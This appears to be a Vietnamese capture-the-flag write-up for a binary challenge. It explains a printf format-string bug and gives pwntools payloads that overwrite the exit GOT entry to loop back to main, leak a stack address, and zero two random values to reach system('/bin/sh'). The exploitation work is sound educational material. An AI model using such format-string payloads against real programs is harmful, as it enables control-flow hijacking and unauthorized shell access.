**1. Find bug**
- ![image](https://user-images.githubusercontent.com/113702087/212830477-eb4a7fe3-9e44-4ff4-84a0-fb858cedd99d.png)
- chương trình đọc dữ liệu từ urandom và ghi 2 byte vào 2 biến buf và v6.
- cho mk nhập name vào biến format và in ra bằng printf -> bug fmt
- và mình phải nhập 1 giá trị num sao cho bằng buf + v6 và sẽ thực thi được system("/bin/sh") còn không sẽ bị exit(0);
- ![image](https://user-images.githubusercontent.com/113702087/212831373-cc61b08a-7bc9-4556-8ace-1749096e81ee.png)
- checksec ta thấy RELRO: Partial RELRO do đó ta có thể ghi vào got ở đây là exit got để khi exit(0) được gọi thì thực thi lại hàm main 1 lần nữa.

**2. Exploit**
```
payload =  b'%4662c%15$hn%11$p'.ljust(24, b'\x00') + p64(exe.got['exit'])

r.sendafter(b'name:\n', payload)
r.sendlineafter(b'gift:\n', b'0')
print(r.recv())
print(r.recvuntil(b'l'))
out = r.recv(14)
print(out)

stack = int(out, 16)
print(hex(stack))
ran = stack - 192
print(ran)
```
- ta dùng %c để in ra 4662 ký tự đổi sang hex là 0x1236 ứng với 2 byte sau của main
- ![image](https://user-images.githubusercontent.com/113702087/212833894-2a0122ff-9975-476f-a4fa-6c879ab3b86a.png)
- dùng %n để ghi 0x1236 byte vào địa chỉ trong stack ở vị trí 15 ( với 64 bit thì đầu stack là vị trí thứ 6 ) -> vị trí thứ 15 là exit got mà ta đã ghi vào (0x404058)
- địa chỉ exit got có giá trị 0x4010b0 đã thành main và %p để leak địa chỉ biến ngay vị trí thứ 11 v7
- ![image](https://user-images.githubusercontent.com/113702087/213097343-eff67d2b-dd9f-4623-a146-2856454afd5e.png)
- ta leak địa chỉ v7 ta sẽ có giá trị của stack để khi lặp lại main ta sẽ tính ra được địa chỉ của buf và v6
- ![image](https://user-images.githubusercontent.com/113702087/212833970-a06cc8b0-09f9-4932-b0c9-e2ef7e5922e2.png)
```
payload =  b'%14$n%15$n'.ljust(16, b'\x00') + p64(ran) + p64(ran + 8)

r.sendafter(b'name:\n', payload)
r.sendlineafter(b'gift:\n', b'0')
```
- ![image](https://user-images.githubusercontent.com/113702087/212834045-6fa1ec39-afc6-4400-a0ac-26bfb096b60e.png)
- loop lại main lần 2 ta dùng %n để ghi đè 2 giá trị buf và v6 thành 0
- ![image](https://user-images.githubusercontent.com/113702087/212834116-f56beaa9-355f-4ce5-abc8-ad5cedf52589.png)
- getshell
- ![image](https://user-images.githubusercontent.com/113702087/212834446-bf7b57c6-54ba-462f-99b0-1ab59cf41cfd.png)

